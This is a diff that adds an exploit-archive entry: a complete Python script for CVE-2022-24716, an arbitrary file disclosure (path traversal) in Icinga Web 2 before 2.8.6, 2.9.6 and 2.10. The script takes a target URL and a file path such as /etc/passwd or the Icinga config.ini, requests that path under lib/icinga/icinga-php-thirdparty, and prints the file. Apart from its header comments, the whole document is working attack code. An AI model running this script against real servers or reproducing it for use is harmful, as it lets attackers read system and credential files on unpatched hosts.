@@ -1,0 +1,76 @@
+id: 38550
+date: 04/08/2023
+title: Icinga Web 2.10 - Arbitrary File Disclosure Exploit
+author: Jacob Ebben
+cves: CVE-2022-24716
+
+#!/usr/bin/env python3
+
+# Exploit Title: Icinga Web 2.10 - Arbitrary File Disclosure
+# Date: 2023-03-19
+# Exploit Author: Jacob Ebben
+# Vendor Homepage: https://icinga.com/
+# Software Link: https://github.com/Icinga/icingaweb2
+# Version: <2.8.6, <2.9.6, <2.10
+# Tested on: Icinga Web 2 Version 2.9.2 on Linux
+# CVE: CVE-2022-24716
+# Based on: https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/
+
+import argparse
+import requests
+from termcolor import colored
+
+def print_message(message, type):
+    if type == 'SUCCESS':
+        print('[' + colored('SUCCESS', 'green') +  '] ' + message)
+    elif type == 'INFO':
+        print('[' + colored('INFO', 'blue') +  '] ' + message)
+    elif type == 'WARNING':
+        print('[' + colored('WARNING', 'yellow') +  '] ' + message)
+    elif type == 'ALERT':
+        print('[' + colored('ALERT', 'yellow') +  '] ' + message)
+    elif type == 'ERROR':
+        print('[' + colored('ERROR', 'red') +  '] ' + message)
+
+def get_normalized_url(url):
+    if url[-1] != '/':
+        url += '/'
+    if url[0:7].lower() != 'http://' and url[0:8].lower() != 'https://':
+        url = "http://" + url
+    return url
+
+def get_proxy_protocol(url):
+    if url[0:8].lower() == 'https://':
+        return 'https'
+    return 'http'
+
+parser = argparse.ArgumentParser(description='Arbitrary File Disclosure Vulnerability in Icinga Web <2.8.6, <2.9.6, <2.10')
+parser.add_argument('TARGET', type=str, 
+                help='Target Icinga location (Example: http://localhost:8080/icinga2/ or https://victim.xyz/icinga/)')
+parser.add_argument('FILE', type=str, 
+                help='Filename to gather from exploit (Example: "/etc/passwd" or "/etc/icingaweb2/config.ini")')
+parser.add_argument('-P','--proxy', type=str,
+                help='HTTP proxy address (Example: http://127.0.0.1:8080/)')
+args = parser.parse_args()
+
+if args.proxy:
+    proxy_url = get_normalized_url(args.proxy)
+    proxy_protocol = get_proxy_protocol(proxy_url)
+    proxies = { proxy_protocol: proxy_url }
+else:
+    proxies = {}
+
+base_url = get_normalized_url(args.TARGET)
+exploit_url = base_url + "lib/icinga/icinga-php-thirdparty" + args.FILE
+
+request = requests.get(base_url, proxies=proxies)
+if request.status_code == 404:
+	print_message("Could not connect to provided URL!", "ERROR")
+	exit()
+
+request = requests.get(exploit_url, proxies=proxies)
+file_content = request.text
+
+print(file_content)
+
+#  0day.today [2023-04-19]  #
